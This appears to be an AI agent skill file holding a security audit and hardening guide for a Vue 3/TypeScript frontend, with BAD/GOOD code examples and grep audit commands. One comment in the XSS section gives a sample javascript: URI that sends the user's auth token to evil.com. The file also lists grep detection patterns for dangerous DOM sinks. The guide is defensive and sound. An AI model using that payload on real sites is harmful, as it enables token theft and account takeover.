---
name: frontend-security
description: >
  Audit Vue 3 + TypeScript frontend for security vulnerabilities. Use when conducting a security
  review, adding authentication flows, handling user input, storing tokens, building API
  integrations, or making changes that could introduce XSS, open redirects, token theft, CSP
  regressions, or sensitive data exposure. Covers Vue 3, TanStack Query v5, Vue Router 4,
  Laravel Echo (Reverb WebSocket), and Vite. Companion to the backend-security skill.
origin: local
---

# Frontend Security — Vue 3 / TypeScript

Security audit and hardening guide for the Movesetters frontend.
Covers the OWASP Top 10 (2021) as it applies to SPA frontends, plus Vue-specific and
TanStack Query–specific attack surfaces.

---

## When to Activate

- Before shipping any feature that handles user input, auth flows, or API responses
- When adding or modifying `v-html`, dynamic `:href`/`:src`, or any direct DOM mutation
- When changing token storage, auth composables (`useAuth`), or logout logic
- When adding new external domains (triggers a CSP `connect-src` update)
- When adding or modifying route guards or WebSocket channel subscriptions
- During a full security review pass on the frontend codebase

---

## 1 — XSS: Vue 3 Attack Surface

Vue `{{ }}` interpolation auto-escapes HTML. The exploitable surfaces are specific.

### `v-html` — highest risk
Any `v-html` with untrusted content is a direct XSS vector. The project bans it without
prior sanitisation — every hit must use DOMPurify:

```ts
import DOMPurify from 'dompurify'
// BAD
<div v-html="userContent" />
// GOOD
<div v-html="DOMPurify.sanitize(userContent, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong'] })" />
```

**Audit:** `grep -rn "v-html" frontend/src/`

### Dynamic `:href` / `:src` — `javascript:` URI injection

```ts
// BAD — offer.link could be "javascript:fetch('https://evil.com?t='+localStorage.auth_token)"
<a :href="offer.link">View offer</a>

// GOOD
const safeHref = computed(() =>
  /^https?:\/\//i.test(offer.link ?? '') ? offer.link : '#'
)
<a :href="safeHref">View offer</a>
```

**Audit:** `grep -rn ":href\|:src" frontend/src/ | grep -v "@/"`

### `v-bind` object spread — event handler injection
Spreading an API-returned object onto an element injects `onVnodeMounted` / `onClick` handlers
because Vue processes any `on*` key as an event listener:

```ts
// BAD — apiResponse could contain { onVnodeMounted: evilFn }
<div v-bind="apiResponse" />
// GOOD — whitelist explicitly
<div :class="apiResponse.cssClass" :data-id="apiResponse.id" />
```

### DOM sinks — forbidden APIs
`grep -rn "eval\|new Function\|innerHTML\|outerHTML\|document\.write" frontend/src/`
Zero hits expected. Any hit is critical.

---

## 2 — Token Storage and Auth State

`useAuth.ts` stores the Bearer token and user in `localStorage` via `useLocalStorage()`.

**Risk:** XSS on any first-party page can read `localStorage` — equivalent to full account
takeover.

**Mitigations already in place:** CSP blocks inline scripts and external script loads;
no `v-html`; no `eval` or DOM sinks.

**Gap 1 — TanStack Query cache survives logout.** Fix:

```ts
// src/composables/useAuth.ts
import { useQueryClient } from '@tanstack/vue-query'

export function useAuth() {
  const queryClient = useQueryClient()

  async function logout(): Promise<void> {
    if (token.value) await logoutApi(token.value)
    token.value = null
    user.value = null
    queryClient.clear()   // evict all cached API responses
  }
}
```

**Gap 2 — token must never appear in a query key** (logged by DevTools and error reporters):

```ts
// BAD
queryKey: ['quotes', token.value]
// GOOD — token is internal to queryFn
queryKey: ['quotes']
queryFn: () => fetchQuotes(token.value!)
```

---

## 3 — Content Security Policy (CSP)

The CSP lives in a `<meta>` tag in `index.html`. A server-sent `Content-Security-Policy`
header is stronger — it also covers the HTML payload itself.

### Current policy risks

| Directive | Value | Note |
|-----------|-------|------|
| `script-src` | `'self'` | No inline scripts, no eval — safe ✓ |
| `style-src` | `'self' 'unsafe-inline'` | Required by Tailwind v4 |
| `connect-src` | `ws://localhost:* http://localhost:8080 ...` | Dev URLs — remove in production |
| `frame-ancestors` | `'none'` | Clickjacking blocked ✓ |
| `object-src` | `'none'` | Plugin execution blocked ✓ |

### Production hardening checklist

- [ ] Move CSP from `<meta>` to an HTTP response header (Nginx / Laravel middleware)
- [ ] Remove `http://localhost:8080` from `connect-src` — use the production API origin
- [ ] Replace `ws://localhost:*` with `wss://your-domain.com` for Reverb
- [ ] Set `VITE_REVERB_SCHEME=https` in production (`forceTLS: true` in `echo.ts`)
- [ ] Consider `upgrade-insecure-requests` in the production header

### Adding new external domains

Every new API, CDN, or tile server must be added to `connect-src` in `index.html` AND
documented in `frontend/CLAUDE.md`. Never use `connect-src *`.

---

## 4 — Route Guard Integrity

Guards in `src/router/index.ts` are **client-side UX only** — the backend enforces the real
access control. An attacker can call the API directly and bypass every frontend guard.

### Guard audit

| Guard | Logic | Status |
|-------|-------|--------|
| `requiresAuth` | `!token.value` → `/login` | ✓ |
| `requiresAdmin` | `user.value?.type !== 'ADMIN'` → `/` | ✓ |
| Path traversal | `TRAVERSAL_RE` regex on `to.params` | ✓ |
| `/users` route | No `requiresAuth` meta | ⚠ Confirm intentional |

### Open redirect — guard against `?redirect=` params

If a return URL is ever added to the login flow, validate it is same-origin:

```ts
function safeRedirectPath(redirect: string | undefined): string {
  if (!redirect) return '/'
  try {
    const url = new URL(redirect, window.location.origin)
    if (url.origin !== window.location.origin) return '/'
    return url.pathname + url.search
  } catch {
    return '/'
  }
}
```

---

## 5 — API URL Construction and ID Injection

`assertSafeId()` must be called before every numeric ID is interpolated into a URL path.
Raw `route.params` must never go directly into a fetch URL:

```ts
// BAD
const id = Number(route.params.id)   // can be NaN, negative, float
fetch(`${API_BASE}/api/quotes/${id}`)

// GOOD
const raw = route.params.id
const id = Number(Array.isArray(raw) ? raw[0] : raw)
assertSafeId(id)   // throws TypeError for NaN / negative / non-integer
fetch(`${API_BASE}/api/quotes/${id}`)
```

**Audit — fetch calls with interpolated segments lacking a guard:**
```bash
grep -rn "\`\${" frontend/src/api/ | grep -v assertSafeId
```

---

## 6 — WebSocket Security (Laravel Echo / Reverb)

### Auth token must be set before subscribing to private channels

`echo.ts` stores the token in `authHeaders`. If `setEchoAuthToken()` is not called after
login, broadcasting auth requests arrive with an empty header and subscriptions fail silently:

```ts
// Call immediately after login() resolves
setEchoAuthToken(token.value!)
// Only then subscribe
echo.private(`quotes.${quoteId}`).listen('OfferPlaced', handler)
```

### Channel names must not contain unvalidated user input

```ts
// BAD
echo.private(`quotes.${route.params.id}`)
// GOOD
const quoteId = Number(route.params.id)
assertSafeId(quoteId)
echo.private(`quotes.${quoteId}`)
```

### TLS enforcement in production

`echo.ts` sets `forceTLS: scheme === 'https'`. Confirm `VITE_REVERB_SCHEME=https` in
the production `.env` — otherwise messages travel over plain `ws://`.

---

## 7 — Environment Variables and Secret Exposure

Every `VITE_*` variable is embedded in the JavaScript bundle at build time and visible
to anyone who downloads the page source.

| Type | Safe in `VITE_`? |
|------|-----------------|
| API base URL, Reverb app key, feature flags | ✓ Yes |
| Database credentials, Stripe secret key, private API keys | ✗ Never |

**Audit:** `grep -rn "VITE_" frontend/src/ frontend/.env.example`

Any value that grants backend access is a critical finding.

---

## 8 — Sensitive Data Exposure

**Never put tokens in URLs** — they appear in browser history, server access logs, and
`Referer` headers:

```ts
// BAD
router.push(`/confirm?token=${emailToken}`)
// GOOD — handle server-side or POST body
```

**Console leaks:**
`grep -rn "console\." frontend/src/ | grep -i "token\|password\|user\|auth"`

**Prototype pollution:** API responses are mapped through typed `apiXxxToYyy()` functions —
maintain this pattern and never use `Object.assign` or spread from a raw API response onto a
shared prototype or global config object.

---

## 9 — Dependency Audit

```bash
# Run from frontend/
pnpm audit          # known CVEs in dependency tree
pnpm outdated       # packages with newer releases
```

High/critical CVEs in direct dependencies require immediate patching.

---

## Constraints

| MUST | MUST NOT |
|------|----------|
| Sanitize with DOMPurify before any `v-html` | Use `v-html` with raw API or user data |
| Validate URL scheme before binding to `:href`/`:src` | Bind user-controlled strings to `:href` unchecked |
| Call `assertSafeId()` before every numeric ID URL interpolation | Interpolate raw `route.params` into fetch URLs |
| Call `queryClient.clear()` on logout | Leave TanStack Query cache populated after logout |
| Confirm `VITE_REVERB_SCHEME=https` and `forceTLS: true` in production | Send WebSocket traffic over `ws://` in production |
| Move CSP to HTTP response header in production | Rely on `<meta>` CSP tag alone in production |
| Restrict `VITE_*` vars to public config only | Store server secrets in `VITE_*` vars |

---

## Reference Guide

| Topic | File | Load when |
|-------|------|-----------|
| Full grep cheatsheet | `references/audit-grep.md` | Running a systematic audit pass |
